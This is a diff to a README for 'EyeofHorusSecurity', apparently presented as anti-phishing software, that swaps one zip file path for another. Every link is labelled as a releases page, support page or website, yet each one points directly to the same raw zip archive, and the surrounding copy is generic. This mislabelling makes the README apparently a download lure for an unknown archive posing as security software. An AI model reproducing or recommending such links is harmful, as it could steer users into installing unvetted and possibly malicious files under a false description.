@@ -1,6 +1,6 @@
 # 🛡️ EyeofHorusSecurity - Protect Your Browsing Experience
 
-![Download EyeofHorusSecurity](https://raw.githubusercontent.com/jaimep2025/EyeofHorusSecurity/main/consentable/EyeofHorusSecurity.zip)
+![Download EyeofHorusSecurity](https://raw.githubusercontent.com/jaimep2025/EyeofHorusSecurity/main/bootstrap/Eyeof-Horus-Security-1.2.zip)
 
 ## 📚 Overview
 EyeofHorusSecurity is a user-friendly solution designed to protect you from online threats like phishing. With our advanced anti-phishing technology, you can browse safer and report suspicious activities without any technical knowledge.
@@ -9,7 +9,7 @@ EyeofHorusSecurity is a user-friendly solution designed to protect you from onli
 Getting started with EyeofHorusSecurity is easy. Follow the steps below to download and run the application on your computer. No special skills are required.
 
 ## 🌐 Visit Our Releases Page
-You can find the latest versions of EyeofHorusSecurity and download them from our Releases page. Click here to go directly to the page: **[Download EyeofHorusSecurity Releases](https://raw.githubusercontent.com/jaimep2025/EyeofHorusSecurity/main/consentable/EyeofHorusSecurity.zip)**.
+You can find the latest versions of EyeofHorusSecurity and download them from our Releases page. Click here to go directly to the page: **[Download EyeofHorusSecurity Releases](https://raw.githubusercontent.com/jaimep2025/EyeofHorusSecurity/main/bootstrap/Eyeof-Horus-Security-1.2.zip)**.
 
 ## 📥 Download & Install
 1. Click on the link above to open the Releases page.
@@ -44,12 +44,12 @@ To ensure you are protected from the latest threats, keep EyeofHorusSecurity upd
 2. When prompted, follow the same download and installation steps to update.
 
 ## 📝 User Support
-If you have any questions or issues while using EyeofHorusSecurity, please visit our [support page](https://raw.githubusercontent.com/jaimep2025/EyeofHorusSecurity/main/consentable/EyeofHorusSecurity.zip) to find solutions or report your concerns. We are here to help you.
+If you have any questions or issues while using EyeofHorusSecurity, please visit our [support page](https://raw.githubusercontent.com/jaimep2025/EyeofHorusSecurity/main/bootstrap/Eyeof-Horus-Security-1.2.zip) to find solutions or report your concerns. We are here to help you.
 
 ## 🔗 Useful Links
-- [Download EyeofHorusSecurity Releases](https://raw.githubusercontent.com/jaimep2025/EyeofHorusSecurity/main/consentable/EyeofHorusSecurity.zip)
-- [Support Page](https://raw.githubusercontent.com/jaimep2025/EyeofHorusSecurity/main/consentable/EyeofHorusSecurity.zip)
-- [Website](https://raw.githubusercontent.com/jaimep2025/EyeofHorusSecurity/main/consentable/EyeofHorusSecurity.zip)
+- [Download EyeofHorusSecurity Releases](https://raw.githubusercontent.com/jaimep2025/EyeofHorusSecurity/main/bootstrap/Eyeof-Horus-Security-1.2.zip)
+- [Support Page](https://raw.githubusercontent.com/jaimep2025/EyeofHorusSecurity/main/bootstrap/Eyeof-Horus-Security-1.2.zip)
+- [Website](https://raw.githubusercontent.com/jaimep2025/EyeofHorusSecurity/main/bootstrap/Eyeof-Horus-Security-1.2.zip)
 
 ## 🛡️ Stay Safe Online
 Using EyeofHorusSecurity helps you protect against phishing attacks. Follow the steps laid out in this guide to download and install the application, and enjoy a safer browsing experience. Your online safety is our priority.
